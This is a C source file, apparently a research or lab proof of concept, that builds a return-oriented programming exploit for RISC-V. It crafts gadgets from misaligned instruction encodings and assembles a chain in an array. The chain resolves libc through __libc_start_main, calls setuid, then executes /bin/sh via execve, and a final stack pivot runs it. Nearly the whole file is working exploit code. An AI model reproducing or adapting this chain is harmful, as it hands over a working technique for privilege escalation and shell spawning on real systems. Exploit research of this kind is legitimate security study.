#include <stdint.h>
#include <unistd.h>
#include <fenv.h>

// Creating a dummy function to trigger the save and restore mechanism of each procedure
void dummy(void)
{
    return;
}

void dummy1(long long a0,long long a1,long long a2,long long a3)
{
    return;
}

void dummy2(long long a0,long long a1,long long a2,long long a3, long long a4)
{
    return;
}

// Fixing variables to registers for better stability over gcc versions. 
// This simulates local variables of functions, allocated to temporary registers t0-t2
volatile register long long int t0 asm ("t0");
volatile register long long int t1 asm ("t1");
volatile register long long int t2 asm ("t2");
volatile register long long int t3 asm ("t3");
volatile register long long int t4 asm ("t4");
volatile register long long int t5 asm ("t5");
volatile register long long int t6 asm ("t6");

volatile register double ft0 asm ("ft0");
volatile register double ft1 asm ("ft1");
volatile register double ft2 asm ("ft2");
volatile register double ft3 asm ("ft3");
volatile register double ft4 asm ("ft4");
volatile register double ft5 asm ("ft5");
volatile register double ft6 asm ("ft6");

// Optimizing every function for size. We do not use -Os directly with
// gcc, as this would inline every gadget function into the main. 
long long fun1  ()  __attribute__ ((optimize("s")));
long long fun2  ()  __attribute__ ((optimize("s")));
long long fun3  ()  __attribute__ ((optimize("s")));
long long fun4  ()  __attribute__ ((optimize("s")));
long long fun5  ()  __attribute__ ((optimize("s")));
long long fun6  ()  __attribute__ ((optimize("s")));
long long fun7  ()  __attribute__ ((optimize("s")));
double    fun8b ()  __attribute__ ((optimize("s")));
long long fun8c ()  __attribute__ ((optimize("s")));
long long fun15b()  __attribute__ ((optimize("s")));
long long fun10()  __attribute__ ((optimize("s")));
long long fun11()  __attribute__ ((optimize("s")));
long long fun15()  __attribute__ ((optimize("s")));
long long fun14()  __attribute__ ((optimize("s")));
long long fun13b()  __attribute__ ((optimize("s")));
long long fun13c()  __attribute__ ((optimize("s")));
long long fun15c()  __attribute__ ((optimize("s")));
long long fun16b()  __attribute__ ((optimize("s")));
long long fun16c()  __attribute__ ((optimize("s")));
long long fun13()  __attribute__ ((optimize("s")));
long long fun17()  __attribute__ ((optimize("s")));
long long fun9()  __attribute__ ((optimize("s")));

long long fun1 ()
{
    // 93a3 130e slti t2,t2,225
    // 1383 3723 addi t1,a5,563 //NOP
    dummy();
    t1+=-1479;              //1303 93a3
    t3=t1-1999;             //130e 1383
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}

long long fun2()
{
    // 93a3 1383 slti t2,t2,-1999
    // 13fc 3723 andi s8,a5,563 //NOP
    dummy();
    t1+=-1479;              //1303 93a3
    t1=t2-63;               //1383 13fc
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}

long long fun3()
{
    // 93a5 1383 slti a1,t2,-1999
    // 13fc 3723 andi s8,a5,563 //NOP
    dummy();
    t1+=-1447;              //1303 93a5
    t1=t2-63;               //1383 13fc
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}

long long fun4(long long x)
{
    // 9383 130f addi t2,t2,241
    // 9388 9304 addi a7,t2,73    
    // 130c 3723 addi s8,a4,563 //NOP
    dummy();
    t3=t2&-1991;            //13fe 9383
    t5=t1-1911;             //130f 9388
    //force gcc not to reorder instructions
    __asm__ __volatile__("":::"memory");
    x=t1+193;               //9304 130c
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return x;
}

long long fun5()
{
    // 9383 13fe addi t2,t2,-31
    // 134c 3723 xori s8,a4,563 //NOP
    dummy();
    t5=t1-1991;             //130f 9383
    t3=t2&1217;             //13fe 134c
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}

long long fun6() 
{
    // 3387 2302 mul a4,t2,sp
    // c301 3723 fmadd.d ft3,fa4,fs3,ft4,rne //NOP
    dummy();
    t1=(signed) 0x87331000;            //3713 3387
    __asm__ __volatile__("":::"memory");
    ((uint8_t *) t1)[4]=(uint8_t) t3;  //2302 c301
    t1=(signed) 0xa0192000;            //3723 19a0
    dummy();
    return t5;
}

long long fun7()
{
    // 13a6 1383 slti a2,t2,-1999
    // 13fc 3723 andi s8,a5,563 //NOP
    dummy();
    t1+=-1439;              //1303 13a6
    t1=t2-63;               //1383 13fc
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}

double fun8b()
{
    // 1307 27b0 addi a4,a4,-1278
    // 1304 3723 addi s0,a4,563 //NOP
    dummy();
    t3=t1+113;               //130e 1307
    ((double*)t2)[16] = ft1; //2720 1304
    t1=(signed) 0xa0192000;  //3723 19a0
    dummy();
    return ft0;
}

long long fun8c()
{
    // 1307 b74f addi a4,a4,1275
    // 1304 3723 addi s0,a4,563 //NOP
    dummy();
    t3=t1+113;               //1303 1307
    t6=0x4134000;            //b74f 1304
    t1=(signed) 0xa0192000;  //3723 19a0
    dummy();
    return t1;
}


long long fun9()
{
    // 1303 3704 addi t1,a4,67
    // 1304 3723 addi s0,a4,563 //NOP
    volatile register long long s0 asm ("s0");
    dummy();
    t1+=49;                 //1303 1303
    s0=0x4130000;           //3704 1304
    __asm__ __volatile__(""::"r" (s0):);
    t3=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}

long long fun10()
{
    // 033b 37fe ld s6,-29(a4)
    // 1304 3723 addi s0,a4,563 //NOP
    dummy();
    t1+=944;                //1303 033b
    t3=0x413f000;           //37fe 1304
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}


long long fun11()
{
    // 033b 1b8e ld s6,-1823(s6)
    // 1304 3723 addi s0,a4,563 //NOP
    register uint32_t ht2 asm ("t2") = (uint32_t) t2;
    register uint32_t ht3 asm ("t3") = (uint32_t) t3;
    dummy();
    t1+=944;                      //1303 033b
    ht3= ht2 + 65;                //1b8e 1304
    t1=(signed) 0xa0192000;       //3723 19a0
    dummy();
    return ht3;
}

long long fun13()
{
    // a33d b719 sd s11,411(a4)
    // 138c 3723 addi s8,a5,563 //NOP
    volatile register long long s3 asm ("s3");
    dummy();
    t3=t1+986;                         //130e a33d
    s3=(signed) 0x8c131000;            //b719 138c
    __asm__ __volatile__(""::"r" (s3):);
    t1=(signed) 0xa0192000;            //3723 19a0
    dummy();
    return s3;
}


long long fun13b()
{
    // a33d b713 sd s11,315(a4)
    // 138c 3723 addi s8,a5,563 //NOP
    dummy();
    t3=t1+986;                         //130e a33d
    t2=(signed) 0x8c131000;            //b713 138c
    t1=(signed) 0xa0192000;            //3723 19a0
    dummy();
    return t1;
}

long long fun14()
{
    // b30d 2301 add s11,t1,s2
    // c301 3723 fmadd.d ft3,fa4,fs3,ft4,rne //NOP
    dummy();
    t3=t2+219;                         //138e b30d
    __asm__ __volatile__("":::"memory");
    ((uint8_t *) t1)[2]=(uint8_t) t3;  //2301 c301
    t1=(signed) 0xa0192000;            //3723 19a0
    dummy();
    return t1;
}

long long fun15()
{
    // 1303 1b8e addi t1,s6,-1823
    // 1304 3723 addi s0,a4,563 //NOP
    register uint32_t ht2 asm ("t2") = (uint32_t) t2;
    register uint32_t ht3 asm ("t3") = (uint32_t) t3;
    volatile register void* s2 asm ("s2");
    __asm__ __volatile__("nop":"=r" (s2)::);
    dummy();
    t1+=49;                    //1303 1303
    ht3= ht2 + 65;             //1b8e 1304
    t1=(signed) 0xa0192000;    //3723 19a0
    dummy();
    return ht3;
}

long long fun15c()
{
    // 9309 b716 addi s3,a4,363
    // 3723 3726 lui  t1,0x26372 //NOP
    dummy();
    //3725 9309
    //b716 3723
    //3726 21a0
    dummy1((signed) 0x9932000,0,(signed) 0xa0212000,(signed) 0x23371000);
    return t1;
}

long long fun16b()
{
    // 93a3 130e sd s3,307(a4)
    // 1383 3723 addi t1,a5,563 //NOP
    dummy();
    t3=(signed) 0x39a35000; //375e a339
    t1=(signed) 0x23371000; //3713 3723
    t3=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}

long long fun16c()
{
    // a335 3717 sd s3,363(a4)
    // 3723 b726 lui t1,0x26b72 //NOP
    dummy();
    t3=(signed) 0x35a35000; //375e a335
    dummy2(0,0,0,(signed) 0xa0292000,(signed) 0x23371000);
    return t1;
}

long long fun17()
{
    // 13b3 137e sltiu t1,t2,2017
    // 13fc 3723 andi s8,a5,563 //NOP
    volatile register long long s0 asm ("s0");
    dummy();
    __asm__ __volatile__(""::"r" (s0):); //pop s0 on return
    t1+=-1231;              //1303 13b3
    t3=t1&-63;              //137e 13fc
    t1=(signed) 0xa0192000; //3723 19a0
    dummy();
    return t1;
}


/*
1    slti t2,t2,225
1    slti t2,t2,225
1    slti t2,t2,225     // NOP
.plt_addr (+1823)
3    slti a1,t2,-1999   // a1 = 0
6    mul a4,t2,sp       // a4 = .base+80
2    slti t2,t2,-1999   // t2 = 0
7    slti a2,t2,-1999   // a2 = 0
8b   addi a4,a4,-1278
8c   addi a4,a4,1275    // a4 = .base+77
5    addi t2,t2,-31
10   ld   s6,-29(a4)
11   ld   s6,-1823(s6)  // s6=.__libc_start_main@libc
15   addi t1,s6,-1823
.offset1 (+1823)
14   add s11,t1,s2      // s11=.setuid@libc:34
13b  sd s11,315(a4)     // .base+392 <- s11
15c  addi s3,a4,363     // s3 = .base+440
16b  sd s3,307(a4)      // .base+384=s3
16c  sd s3,363(a4)      // .base+440=s3
15   addi t1,s6,-1823
.offset2 (+1823)
14   add s11,t1,s2      // s11=.setuid@libc:38
13   sd s11,411(a4)     // .base+488 <- s11
5    addi t2,t2,-31 
5    addi t2,t2,-31 
17   sltiu t1,t2,2017   // a0 = 0
ecall1
4    ******             //a7 = 221
9    addi t1,a4,67      //a0 = .base+507
ecall2
/bin/sh
*/

uint64_t tab[420] = {0};

void exploit(uint64_t* shellcode)
{
    dummy();
    //argument in a0
    __asm__("mv sp, a0");
    return;
}

#include <stdio.h>

int main(void)
{
    tab[0] = 0;
    tab[1] = ((uint64_t) &fun1)+10;
    tab[2] = 0;
    tab[3] = ((uint64_t) &fun1)+10; //t2 = 1
    tab[4] = 0;
    tab[5] = ((uint64_t) &fun1)+10; //NOP
    tab[6] = 0x12010 + 1823; //PLT addr + 1823
    tab[7] = ((uint64_t) &fun3)+10; //a1 = 0
    tab[8] = 0; //64
    tab[9] = ((uint64_t) &fun6)+10; //a4=base+80
    tab[10] = 0;
    tab[11] = ((uint64_t) &fun2)+10; //t2=0
    tab[12] = 0;
    tab[13] = ((uint64_t) &fun7)+10;
    tab[14] = 0;
    tab[15] = ((uint64_t) &fun8b)+10;
    tab[16] = 0; //128
    tab[17] = ((uint64_t) &fun8c)+10; //a4=base+77
    tab[18] = 0;
    tab[19] = ((uint64_t) &fun5)+10; //t2=-31
    tab[20] = 0;
    tab[21] = ((uint64_t) &fun10)+10; 
    tab[22] = 0; 
    tab[23] = ((uint64_t) &fun11)+10;
    tab[24] = 0; //192
    tab[25] = ((uint64_t) &fun15)+14;
    tab[26] = 0x64637; //offsetcall (poped into s2)
    tab[27] = ((uint64_t) &fun14)+10;
    tab[28] = 0;
    tab[29] = ((uint64_t) &fun13b)+10; //store ecall1 to tab[49]
    tab[30] = 0;
    tab[31] = ((uint64_t) &fun15c)+10; 
    tab[32] = 0; //256
    tab[33] = ((uint64_t) &fun16b)+10; //store &tab[55] at tab[48]
    tab[34] = 0; 
    tab[35] = ((uint64_t) &fun16c)+12; //store &tab[55] at tab[55]
    tab[36] = 0; 
    tab[37] = ((uint64_t) &fun15)+14;
    tab[38] = 0x6463b; //offsetcall (poped into s2)
    tab[39] = ((uint64_t) &fun14)+10;
    tab[40] = 0; 
    tab[41] = ((uint64_t) &fun13)+12; //store ecall1 to tab[61]
    tab[42] = 0;
    tab[43] = ((uint64_t) &fun5)+10;
    tab[44] = 0;
    tab[45] = ((uint64_t) &fun5)+10; //t2=-93
    tab[46] = 0;
    tab[47] = ((uint64_t) &fun17)+12;

    tab[48] = 0; //write s0 here such that s0 = 40 + sp ie (&tab[49]+XXX) gadget 16b
    tab[49] = 0; //ecall1   (gadget 13b)

    //setuid call frame
    tab[50] = 0; //restore
    tab[51] = 0; //restore
    tab[52] = 0; //restore
    tab[53] = 0; //restore
    tab[54] = 0; //restore
    tab[55] = 0; //canary == a4 == s3 + restoring a4
    tab[56] = 0; //restore
    tab[57] = ((uint64_t) &fun4)+12;  //t2=221


    tab[58] = 0;
    tab[59] = ((uint64_t) &fun9)+12; 
    tab[60] = 0;
    tab[61] = 0; //ecall2addr

    tab[62] = 0;
    tab[63] = 0x2f6e69622f000000; //  "hs//nib/"
    tab[64] = 0x68732f;

    for(int i = 0; i < 8*37; i++)
    {
        printf("\\x%02x",*(((uint8_t*) tab)+i));
    }
    printf("\n");
    exploit(((void *)tab)-0x10);
    return 0;
}
